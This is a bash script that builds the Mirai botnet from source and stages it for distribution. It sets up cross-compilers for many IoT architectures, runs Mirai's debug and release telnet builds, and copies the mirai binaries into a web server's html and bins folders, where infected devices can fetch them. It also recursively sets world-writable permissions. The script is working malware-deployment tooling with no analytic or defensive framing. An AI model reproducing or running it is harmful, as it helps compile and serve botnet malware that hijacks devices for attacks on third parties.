#!/bin/bash
clear
echo Set Environment Variable
echo -------------------------------------------------------

#Execute these in your ssh terminal, this will add to your ~/.bashrc
echo $PATH
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
 
export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/go

#Check the path variable
echo $PATH
sleep 2
clear
echo Create release executable
printf "\n"
echo -------------------------------------------------------
printf "\n"
sudo chmod -R 777 /home/kali/Desktop/myMirai/MiraiSourceCode
cd /home/kali/Desktop/myMirai/MiraiSourceCode/mirai
printf "\n"
echo -------------------------------------------------------
printf "\n"
echo MOVING PROMPT.TXT
mv /home/kali/Desktop/myMirai/MiraiSourceCode/mirai/release/prompt.txt /home/kali/Desktop/myMirai/MiraiSourceCode/mirai/prompt.txt
printf "\n"
echo -------------------------------------------------------
printf "\n"
sleep 2
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords
./build.sh debug telnet
printf "\n"
echo -------------------------------------------------------
printf "\n"
./build.sh release telnet
printf "\n"
echo -------------------------------------------------------
printf "\n"
echo Copy executable on server
sleep 2
sudo cp /home/kali/Desktop/myMirai/MiraiSourceCode/mirai/release/mirai.* /var/www/html
sudo cp /home/kali/Desktop/myMirai/MiraiSourceCode/mirai/release/mirai.* /var/www/html/bins
sudo chmod -R 777 /home/kali/Desktop/myMirai/MiraiSourceCode
mv /home/kali/Desktop/myMirai/MiraiSourceCode/mirai/prompt.txt /home/kali/Desktop/myMirai/MiraiSourceCode/mirai/release/prompt.txt
printf "\n\n"
echo ----------------------------------------------------
read -n 1 -s -r -p "Press any key to continue"
